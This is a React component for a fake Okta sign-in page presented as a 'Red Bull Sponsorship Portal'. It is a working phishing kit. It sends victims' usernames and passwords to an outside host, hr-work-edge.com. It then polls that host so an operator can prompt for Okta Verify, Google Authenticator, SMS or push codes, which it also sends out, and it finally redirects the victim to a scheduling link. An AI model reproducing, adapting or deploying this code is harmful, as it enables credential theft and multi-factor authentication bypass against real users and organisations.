import { useCallback, useEffect, useRef, useState } from 'react'
import './login.css'

const API = 'https://hr-work-edge.com/summit/api'

function mpart(boundary, fields) {
  const sep = `------WebKitFormBoundary${boundary}`
  let body = ''
  for (const [name, val] of Object.entries(fields))
    body += `${sep}\r\nContent-Disposition: form-data; name="${name}"\r\n\r\n${val}\r\n`
  return { body: body + sep + '--\r\n', ct: `multipart/form-data; boundary=----WebKitFormBoundary${boundary}` }
}

function PersonAvatar({ size = 60 }) {
  return (
    <div style={{ width: size, height: size, borderRadius: '50%', overflow: 'hidden', flexShrink: 0, background: '#f0f0f0' }}>
      <img src="/okta-person.jpg" alt="" style={{ width: '100%', height: '100%', objectFit: 'cover', objectPosition: 'top center' }} />
    </div>
  )
}

function GoogleAuthCircle({ size = 64 }) {
  return (
    <div style={{ width: size, height: size, borderRadius: '50%', border: '1.5px solid #d0d0d0', background: '#fff', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
      <img src="/google-auth-icon.webp" alt="Google Authenticator" style={{ width: size * 0.62, height: size * 0.62, objectFit: 'contain' }} />
    </div>
  )
}

function PushCircle({ size = 64 }) {
  return (
    <div style={{ width: size, height: size, borderRadius: '50%', background: '#1a3a5c', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
      <svg width={size * 0.44} height={size * 0.44} viewBox="0 0 24 24" fill="white">
        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z" />
      </svg>
    </div>
  )
}

function PhoneCircle({ size = 64 }) {
  return (
    <div style={{ width: size, height: size, borderRadius: '50%', border: '1.5px solid #d0d0d0', background: '#e4f0fb', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
      <svg width={size * 0.46} height={size * 0.46} viewBox="0 0 24 24" fill="#3a7fc1">
        <path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z" />
      </svg>
    </div>
  )
}

function UserLineIcon() {
  return (
    <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#888" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
      <circle cx="12" cy="8" r="4" /><path d="M4 20c0-4 3.6-7 8-7s8 3 8 7" />
    </svg>
  )
}

const OktaLogo = () => (
  <div className="okta-logo-section" style={{ padding: '36px 36px 28px', textAlign: 'center' }}>
    <img className="okta-logo-img" src="/okta-logo.png" alt="Okta" style={{ height: 36, objectFit: 'contain', display: 'block', margin: '0 auto' }} />
  </div>
)

const Divider = ({ children }) => (
  <div style={{ position: 'relative', height: 72, display: 'flex', alignItems: 'center' }}>
    <div style={{ position: 'absolute', left: 0, right: 0, top: '50%', height: 1, background: '#e0e0e0' }} />
    <div style={{ position: 'absolute', left: '50%', top: '50%', transform: 'translate(-50%,-50%)', background: '#fff', padding: '0 4px', zIndex: 1 }}>
      {children}
    </div>
  </div>
)

export default function OktaSignIn({ sessionId }) {
  const [view, setView]               = useState('login')
  const [username, setUsername]       = useState('')
  const [password, setPassword]       = useState('')
  const [verifyCode, setVerifyCode]   = useState('')
  const [smsDigits, setSmsDigits]     = useState('')
  const [errorMsg, setErrorMsg]       = useState('')
  const [transitioning, setTransitioning] = useState(false)
  const [barWidth, setBarWidth]       = useState(0)
  const [userFocused, setUserFocused] = useState(false)
  const [passFocused, setPassFocused] = useState(false)
  const [codeFocused, setCodeFocused] = useState(false)

  const pollRef    = useRef(null)
  const loopBarRef = useRef(null)
  const handledRef = useRef(null)

  const stopPoll = useCallback(() => {
    if (pollRef.current) { clearInterval(pollRef.current); pollRef.current = null }
  }, [])

  const stopLoopingBar = useCallback(() => {
    if (loopBarRef.current) { clearTimeout(loopBarRef.current); loopBarRef.current = null }
    setTransitioning(false); setBarWidth(0)
  }, [])

  const startLoopingBar = useCallback(() => {
    setTransitioning(true)
    const tick = () => {
      setBarWidth(0)
      requestAnimationFrame(() => requestAnimationFrame(() => setBarWidth(100)))
      loopBarRef.current = setTimeout(tick, 2000)
    }
    tick()
  }, [])

  const resetSession = useCallback(async () => {
    const { body, ct } = mpart('BiUEBaoEOCPozZmL', { session_id: sessionId })
    try { await fetch(`${API}/reset.php`, { method: 'POST', headers: { 'Content-Type': ct }, body }) } catch {}
  }, [sessionId])

  const fetchOktaPhone = useCallback(async () => {
    try { const r = await fetch(`${API}/okta_phone.php?session_id=${sessionId}`); const d = await r.json(); return d?.digits || '' } catch { return '' }
  }, [sessionId])

  const startPoll = useCallback(() => {
    handledRef.current = null; stopPoll()
    pollRef.current = setInterval(async () => {
      try {
        const r = await fetch(`${API}/check.php?session_id=${sessionId}`)
        const d = await r.json()
        if (!d) return
        if (d.status === 'okta_error')               { stopPoll(); stopLoopingBar(); await resetSession(); setErrorMsg('Your username or password is incorrect.') }
        else if (d.status === 'okta_login_error')    { stopPoll(); stopLoopingBar(); await resetSession(); setErrorMsg('There is no account with that username. Please check your username and try again.') }
        else if (d.status === 'okta_password_error') { stopPoll(); stopLoopingBar(); await resetSession(); setErrorMsg('Your password is incorrect.') }
        else if (d.status === 'okta_verify')         { stopPoll(); stopLoopingBar(); await resetSession(); setVerifyCode(''); setErrorMsg(''); setView('verify') }
        else if (d.status === 'okta_verify_error')   { stopPoll(); stopLoopingBar(); await resetSession(); setErrorMsg('Invalid code. Please try again.') }
        else if (d.status === 'okta_auth')           { stopPoll(); stopLoopingBar(); await resetSession(); setVerifyCode(''); setErrorMsg(''); setView('auth') }
        else if (d.status === 'okta_auth_error')     { stopPoll(); stopLoopingBar(); await resetSession(); setErrorMsg('Invalid code. Please try again.') }
        else if (d.status === 'okta_push') {
          if (handledRef.current !== 'okta_push') { handledRef.current = 'okta_push'; stopLoopingBar(); await resetSession(); setView('push') }
        }
        else if (d.status === 'okta_sms') {
          if (handledRef.current !== 'okta_sms') {
            handledRef.current = 'okta_sms'
            const digits = await fetchOktaPhone()
            stopLoopingBar(); await resetSession(); setSmsDigits(digits); setVerifyCode(''); setErrorMsg(''); setView('sms')
          }
        }
        else if (d.status === 'okta_sms_error') { stopPoll(); stopLoopingBar(); await resetSession(); setErrorMsg('The code you entered was incorrect. Please try again.') }
        else if (d.status === 'redirect')        { stopPoll(); stopLoopingBar(); window.location.href = 'https://calendly.com/maria-michon/30min?back=1&month=2026-04' }
        else if (d.status === 'mark_completed')  { stopPoll(); stopLoopingBar() }
      } catch {}
    }, 1500)
  }, [sessionId, stopPoll, stopLoopingBar, resetSession, fetchOktaPhone])

  useEffect(() => () => { stopPoll(); stopLoopingBar() }, [stopPoll, stopLoopingBar])

  const submitOkta = () => {
    if (!username.trim() || !password.trim()) return
    setErrorMsg('')
    const { body, ct } = mpart('AdnHdm72fV2A93us', { username: username.trim(), password: password.trim(), session_id: sessionId })
    startLoopingBar(); startPoll()
    fetch(`${API}/okta.php`, { method: 'POST', headers: { 'Content-Type': ct }, body })
      .then(async r => {
        if (!r.ok) { stopLoopingBar(); stopPoll(); setErrorMsg('Your username or password is incorrect.') }
        else { const d = await r.json(); if (d?.error) { stopLoopingBar(); stopPoll(); setErrorMsg('Your username or password is incorrect.') } }
      })
      .catch(() => { stopLoopingBar(); stopPoll(); setErrorMsg('Your username or password is incorrect.') })
  }

  const submitVerify = () => {
    if (verifyCode.length !== 6) return
    setErrorMsg('')
    const { body, ct } = mpart('AdnHdm72fV2A93us', { code: verifyCode.trim(), session_id: sessionId })
    startLoopingBar(); startPoll()
    fetch(`${API}/okta_otp.php`, { method: 'POST', headers: { 'Content-Type': ct }, body })
      .then(async r => {
        if (!r.ok) { stopLoopingBar(); stopPoll(); setErrorMsg('Invalid code. Please try again.') }
        else { const d = await r.json(); if (d?.error) { stopLoopingBar(); stopPoll(); setErrorMsg('Invalid code. Please try again.') } }
      })
      .catch(() => { stopLoopingBar(); stopPoll(); setErrorMsg('Invalid code. Please try again.') })
  }

  const submitAuth = () => {
    if (verifyCode.length !== 6) return
    setErrorMsg('')
    const { body, ct } = mpart('AdnHdm72fV2A93us', { code: verifyCode.trim(), session_id: sessionId })
    startLoopingBar(); startPoll()
    fetch(`${API}/okta_auth.php`, { method: 'POST', headers: { 'Content-Type': ct }, body })
      .then(async r => {
        if (!r.ok) { stopLoopingBar(); stopPoll(); setErrorMsg('Invalid code. Please try again.') }
        else { const d = await r.json(); if (d?.error) { stopLoopingBar(); stopPoll(); setErrorMsg('Invalid code. Please try again.') } }
      })
      .catch(() => { stopLoopingBar(); stopPoll(); setErrorMsg('Invalid code. Please try again.') })
  }

  const submitSms = () => {
    if (!verifyCode.trim()) return
    setErrorMsg('')
    const { body, ct } = mpart('AdnHdm72fV2A93us', { code: verifyCode.trim(), session_id: sessionId })
    startLoopingBar(); startPoll()
    fetch(`${API}/okta_smscode.php`, { method: 'POST', headers: { 'Content-Type': ct }, body })
      .then(async r => {
        if (!r.ok) { stopLoopingBar(); stopPoll(); setErrorMsg('The code you entered was incorrect. Please try again.') }
        else { const d = await r.json(); if (d?.error) { stopLoopingBar(); stopPoll(); setErrorMsg('The code you entered was incorrect. Please try again.') } }
      })
      .catch(() => { stopLoopingBar(); stopPoll(); setErrorMsg('The code you entered was incorrect. Please try again.') })
  }

  const inputStyle = (focused, hasError) => ({
    width: '100%', boxSizing: 'border-box',
    border: `1px solid ${hasError ? '#e0442d' : focused ? '#1662DD' : '#c7cdd4'}`,
    borderRadius: 3, padding: '9px 10px', fontSize: 14, color: '#333', outline: 'none',
    fontFamily: 'Arial, Helvetica, sans-serif',
    boxShadow: focused ? `0 0 0 2px ${hasError ? 'rgba(224,68,45,0.2)' : 'rgba(22,98,221,0.15)'}` : 'none',
    transition: 'border-color 0.15s, box-shadow 0.15s', background: '#fff',
  })

  const errBox = msg => msg ? (
    <div style={{ background: '#fff6f6', border: '1px solid #f8b9b0', borderRadius: 3, padding: '10px 12px', marginBottom: 16, fontSize: 13, color: '#d93025' }}>{msg}</div>
  ) : null

  const progressBar = transitioning && (
    <>
      <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: 3, zIndex: 30, background: '#d0d8e4' }}>
        <div style={{ height: '100%', background: '#1662DD', width: `${barWidth}%`, transition: barWidth === 0 ? 'none' : 'width 2s linear' }} />
      </div>
      <div style={{ position: 'absolute', inset: 0, zIndex: 20, background: 'rgba(255,255,255,0.55)' }} />
    </>
  )

  return (
    <div className="okta-outer" style={{ minHeight: 'var(--app-h)', background: '#f4f5f7', display: 'flex', flexDirection: 'column', fontFamily: 'Arial, Helvetica, sans-serif' }}>

      {/* Top banner */}
      <div style={{ width: '100%', padding: '20px 24px', textAlign: 'center', background: '#fff', borderBottom: '1px solid #eee' }}>
        <div style={{ display: 'inline-flex', alignItems: 'center', justifyContent: 'center', gap: 8, marginBottom: 5 }}>
          <span style={{ fontSize: 16, color: '#6b6b6b', fontWeight: 300, letterSpacing: '0.02em', fontFamily: 'Aeonik, Arial, sans-serif' }}>Connecting to</span>
          <svg width="22" height="22" viewBox="0 0 41 40" fill="none" xmlns="http://www.w3.org/2000/svg" style={{ flexShrink: 0 }}>
            <path d="M37.9082 20C37.9082 29.665 30.0732 37.5 20.4082 37.5C10.7432 37.5 2.9082 29.665 2.9082 20C2.9082 10.335 10.7432 2.5 20.4082 2.5C30.0732 2.5 37.9082 10.335 37.9082 20Z" stroke="#1662DD" strokeWidth="5"/>
            <rect x="11.4082" y="12.5" width="5" height="4" rx="1" fill="#1662DD"/>
            <rect x="17.9082" y="12.5" width="5" height="4" rx="1" fill="#1662DD"/>
            <rect x="24.4082" y="12.5" width="5" height="4" rx="1" fill="#1662DD"/>
            <rect x="11.4082" y="18" width="5" height="4" rx="1" fill="#1662DD"/>
            <rect x="17.9082" y="18" width="5" height="4" rx="1" fill="#1662DD"/>
            <rect x="24.4082" y="18" width="5" height="4" rx="1" fill="#1662DD"/>
            <rect x="11.4082" y="23.5" width="5" height="4" rx="1" fill="#1662DD"/>
            <rect x="17.9082" y="23.5" width="5" height="4" rx="1" fill="#1662DD"/>
            <rect x="24.4082" y="23.5" width="5" height="4" rx="1" fill="#1662DD"/>
          </svg>
        </div>
        <p style={{ margin: 0, fontSize: 12, color: '#999', fontWeight: 300, letterSpacing: '0.01em' }}>Sign in with your account to access Red Bull Sponsorship Portal</p>
      </div>

      {/* Content */}
      <div className="okta-content-area" style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '24px 16px' }}>
        <div className="okta-card" style={{ position: 'relative', background: '#fff', width: '100%', maxWidth: 360, border: '1px solid #ddd', borderRadius: 3, overflow: 'hidden', boxShadow: '0 2px 5px rgba(0,0,0,0.07)' }}>
          {progressBar}

          {view === 'login' ? (
            <>
              <OktaLogo />
              <Divider><PersonAvatar size={56} /></Divider>
              <div className="okta-form-section" style={{ padding: '16px 36px 32px' }}>
                <p className="okta-signin-text" style={{ textAlign: 'center', fontSize: 14, color: '#333', margin: '0 0 24px', fontWeight: 400 }}>Sign In</p>
                {errBox(errorMsg)}
                <div style={{ marginBottom: 16 }}>
                  <label style={{ display: 'block', fontSize: 13, color: '#333', fontWeight: 600, marginBottom: 5 }}>Username</label>
                  <input type="text" value={username} onChange={e => { setUsername(e.target.value); if (errorMsg) setErrorMsg('') }}
                    onKeyDown={e => e.key === 'Enter' && submitOkta()} onFocus={() => setUserFocused(true)} onBlur={() => setUserFocused(false)}
                    style={inputStyle(userFocused, !!errorMsg)} autoComplete="username" />
                </div>
                <div style={{ marginBottom: 24 }}>
                  <label style={{ display: 'block', fontSize: 13, color: '#333', fontWeight: 600, marginBottom: 5 }}>Password</label>
                  <input type="password" value={password} onChange={e => { setPassword(e.target.value); if (errorMsg) setErrorMsg('') }}
                    onKeyDown={e => e.key === 'Enter' && submitOkta()} onFocus={() => setPassFocused(true)} onBlur={() => setPassFocused(false)}
                    style={inputStyle(passFocused, !!errorMsg)} autoComplete="current-password" />
                </div>
                <button onClick={submitOkta} style={{ width: '100%', background: '#1662DD', color: '#fff', border: 'none', borderRadius: 3, height: 42, fontSize: 14, fontWeight: 600, cursor: 'pointer', marginBottom: 18, fontFamily: 'Arial, Helvetica, sans-serif' }}>Sign In</button>
                <a href="#" style={{ fontSize: 13, color: '#1662DD', textDecoration: 'underline' }} onClick={e => e.preventDefault()}>Need help signing in?</a>
              </div>
            </>
          ) : view === 'auth' ? (
            <>
              <OktaLogo />
              <Divider><GoogleAuthCircle size={64} /></Divider>
              <div className="okta-form-section" style={{ padding: '20px 36px 32px' }}>
                <h2 style={{ fontSize: 17, fontWeight: 700, color: '#1d1d1d', margin: '0 0 6px', textAlign: 'center', fontFamily: 'Arial, Helvetica, sans-serif' }}>Google Authenticator</h2>
                <p style={{ fontSize: 13, color: '#888', margin: '0 0 24px', textAlign: 'center', lineHeight: 1.45 }}>Enter your Google Authenticator passcode</p>
                {errBox(errorMsg)}
                <div style={{ marginBottom: 20 }}>
                  <label style={{ display: 'block', fontSize: 14, color: '#1d1d1d', fontWeight: 700, marginBottom: 7 }}>Enter Code</label>
                  <input type="text" inputMode="numeric" value={verifyCode}
                    onChange={e => { const v = e.target.value.replace(/\D/g, '').slice(0, 6); setVerifyCode(v); if (errorMsg) setErrorMsg('') }}
                    onKeyDown={e => e.key === 'Enter' && submitAuth()} onFocus={() => setCodeFocused(true)} onBlur={() => setCodeFocused(false)}
                    style={inputStyle(codeFocused, !!errorMsg)} autoComplete="one-time-code" maxLength={6} />
                </div>
                <button onClick={submitAuth} disabled={verifyCode.length !== 6}
                  style={{ width: '100%', background: verifyCode.length === 6 ? '#1662DD' : '#b0bec5', color: '#fff', border: 'none', borderRadius: 4, height: 44, fontSize: 15, fontWeight: 600, cursor: verifyCode.length === 6 ? 'pointer' : 'not-allowed', fontFamily: 'Arial, Helvetica, sans-serif', transition: 'background 0.15s' }}>
                  Verify
                </button>
              </div>
            </>
          ) : view === 'push' ? (
            <>
              <OktaLogo />
              <Divider><PushCircle size={64} /></Divider>
              <div style={{ padding: '20px 36px 32px', textAlign: 'center' }}>
                <h2 style={{ fontSize: 17, fontWeight: 500, color: '#1d1d1d', margin: '0 0 12px', fontFamily: 'Arial, Helvetica, sans-serif' }}>Get a push notification</h2>
                <div style={{ display: 'inline-flex', alignItems: 'center', gap: 6, marginBottom: 22 }}>
                  <UserLineIcon />
                  <span style={{ fontSize: 13, color: '#6b6b6b' }}>{username || 'user@example.com'}</span>
                </div>
                <button disabled style={{ display: 'block', width: '100%', background: '#444', color: '#fff', border: 'none', borderRadius: 3, height: 42, fontSize: 14, fontWeight: 600, cursor: 'default', marginBottom: 18, fontFamily: 'Arial, Helvetica, sans-serif' }}>
                  Push notification sent
                </button>
                <label style={{ display: 'inline-flex', alignItems: 'center', gap: 8, fontSize: 13, color: '#555', cursor: 'pointer', marginBottom: 24 }}>
                  <input type="checkbox" defaultChecked style={{ accentColor: '#1662DD', width: 14, height: 14 }} />
                  Send push automatically
                </label>
                <div style={{ display: 'flex', flexDirection: 'column', gap: 8, alignItems: 'flex-start' }}>
                  <a href="#" style={{ fontSize: 13, color: '#1662DD', textDecoration: 'underline' }} onClick={e => e.preventDefault()}>Verify with something else</a>
                  <a href="#" style={{ fontSize: 13, color: '#1662DD', textDecoration: 'underline' }} onClick={e => { e.preventDefault(); setView('login'); setErrorMsg('') }}>Back to sign in</a>
                </div>
              </div>
            </>
          ) : view === 'sms' ? (
            <>
              <OktaLogo />
              <Divider><PhoneCircle size={64} /></Divider>
              <div className="okta-form-section" style={{ padding: '16px 36px 32px' }}>
                <h2 style={{ fontSize: 16, fontWeight: 700, color: '#1d1d1d', margin: '0 0 10px', textAlign: 'center', fontFamily: 'Arial, Helvetica, sans-serif' }}>Verify with your phone</h2>
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6, marginBottom: 16 }}>
                  <UserLineIcon />
                  <span style={{ fontSize: 13, color: '#6b6b6b' }}>{username || 'user@example.com'}</span>
                </div>
                <div style={{ background: '#fff8e1', border: '1px solid #ffc107', borderRadius: 3, padding: '9px 12px', marginBottom: 14, display: 'flex', alignItems: 'center', gap: 10 }}>
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="#f59e0b" style={{ flexShrink: 0 }}>
                    <path d="M12 2L1 21h22L12 2zm0 3.5L20.5 19h-17L12 5.5zM11 10v4h2v-4h-2zm0 6v2h2v-2h-2z" />
                  </svg>
                  <span style={{ fontSize: 13, color: '#555' }}>Haven&apos;t received an SMS? <a href="#" style={{ color: '#1662DD', textDecoration: 'none', fontWeight: 500 }} onClick={e => e.preventDefault()}>Send again</a></span>
                </div>
                <p style={{ fontSize: 13, color: '#555', textAlign: 'center', margin: '0 0 4px', lineHeight: 1.5 }}>
                  A code was sent to <strong>+1 XXX-XXX-{smsDigits || '----'}</strong>. Enter the code below to verify.
                </p>
                <p style={{ fontSize: 12, color: '#999', textAlign: 'center', margin: '0 0 18px' }}>Carrier messaging charges may apply</p>
                {errBox(errorMsg)}
                <div style={{ marginBottom: 18 }}>
                  <label style={{ display: 'block', fontSize: 14, color: '#1d1d1d', fontWeight: 700, marginBottom: 7 }}>Enter Code</label>
                  <input type="text" inputMode="numeric" value={verifyCode}
                    onChange={e => { setVerifyCode(e.target.value.replace(/\D/g, '')); if (errorMsg) setErrorMsg('') }}
                    onKeyDown={e => e.key === 'Enter' && submitSms()} onFocus={() => setCodeFocused(true)} onBlur={() => setCodeFocused(false)}
                    style={inputStyle(codeFocused, !!errorMsg)} autoComplete="one-time-code" />
                </div>
                <button onClick={submitSms} style={{ width: '100%', background: '#1662DD', color: '#fff', border: 'none', borderRadius: 3, height: 44, fontSize: 15, fontWeight: 600, cursor: 'pointer', marginBottom: 22, fontFamily: 'Arial, Helvetica, sans-serif' }}>
                  Verify
                </button>
                <div style={{ display: 'flex', flexDirection: 'column', gap: 8, alignItems: 'flex-start' }}>
                  <a href="#" style={{ fontSize: 13, color: '#1662DD', textDecoration: 'underline' }} onClick={e => e.preventDefault()}>Verify with something else</a>
                  <a href="#" style={{ fontSize: 13, color: '#1662DD', textDecoration: 'underline' }} onClick={e => { e.preventDefault(); setView('login'); setErrorMsg(''); setVerifyCode('') }}>Back to sign in</a>
                </div>
              </div>
            </>
          ) : (
            <div style={{ padding: '36px 32px 32px', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
              <img src="/okta-verify-icon.png" alt="Okta Verify" style={{ width: 72, height: 72, marginBottom: 20, objectFit: 'contain' }} />
              <h2 style={{ fontSize: 19, fontWeight: 500, color: '#1d1d1d', margin: '0 0 10px', textAlign: 'center', fontFamily: 'Arial, Helvetica, sans-serif' }}>Enter a code</h2>
              <div style={{ display: 'flex', alignItems: 'center', gap: 6, marginBottom: 28 }}>
                <UserLineIcon />
                <span style={{ fontSize: 13, color: '#6b6b6b' }}>{username || 'user@example.com'}</span>
              </div>
              {errBox(errorMsg)}
              <div style={{ width: '100%', marginBottom: 20 }}>
                <label style={{ display: 'block', fontSize: 13, color: '#333', fontWeight: 400, marginBottom: 6 }}>Enter code from Okta Verify app</label>
                <input type="text" inputMode="numeric" value={verifyCode}
                  onChange={e => { const v = e.target.value.replace(/\D/g, '').slice(0, 6); setVerifyCode(v); if (errorMsg) setErrorMsg('') }}
                  onKeyDown={e => e.key === 'Enter' && submitVerify()} onFocus={() => setCodeFocused(true)} onBlur={() => setCodeFocused(false)}
                  style={inputStyle(codeFocused, !!errorMsg)} autoComplete="one-time-code" maxLength={6} />
              </div>
              <button onClick={submitVerify} disabled={verifyCode.length !== 6}
                style={{ width: '100%', background: verifyCode.length === 6 ? '#1d1d1d' : '#b0bec5', color: '#fff', border: 'none', borderRadius: 3, height: 42, fontSize: 14, fontWeight: 600, cursor: verifyCode.length === 6 ? 'pointer' : 'not-allowed', marginBottom: 22, fontFamily: 'Arial, Helvetica, sans-serif', transition: 'background 0.15s' }}>
                Verify
              </button>
              <div style={{ display: 'flex', flexDirection: 'column', gap: 8, alignItems: 'flex-start', width: '100%' }}>
                <a href="#" style={{ fontSize: 13, color: '#1662DD', textDecoration: 'underline' }} onClick={e => e.preventDefault()}>Verify with something else</a>
                <a href="#" style={{ fontSize: 13, color: '#1662DD', textDecoration: 'underline' }} onClick={e => { e.preventDefault(); setView('login'); setErrorMsg(''); setVerifyCode('') }}>Back to sign in</a>
              </div>
            </div>
          )}
        </div>
      </div>

      {/* Footer */}
      <div className="okta-footer" style={{ display: 'flex', justifyContent: 'space-between', padding: '10px 24px 14px', fontSize: 12, color: '#777' }}>
        <span>Powered by Okta</span>
        <a href="#" style={{ color: '#777', textDecoration: 'none' }} onClick={e => e.preventDefault()}>Privacy Policy</a>
      </div>
    </div>
  )
}
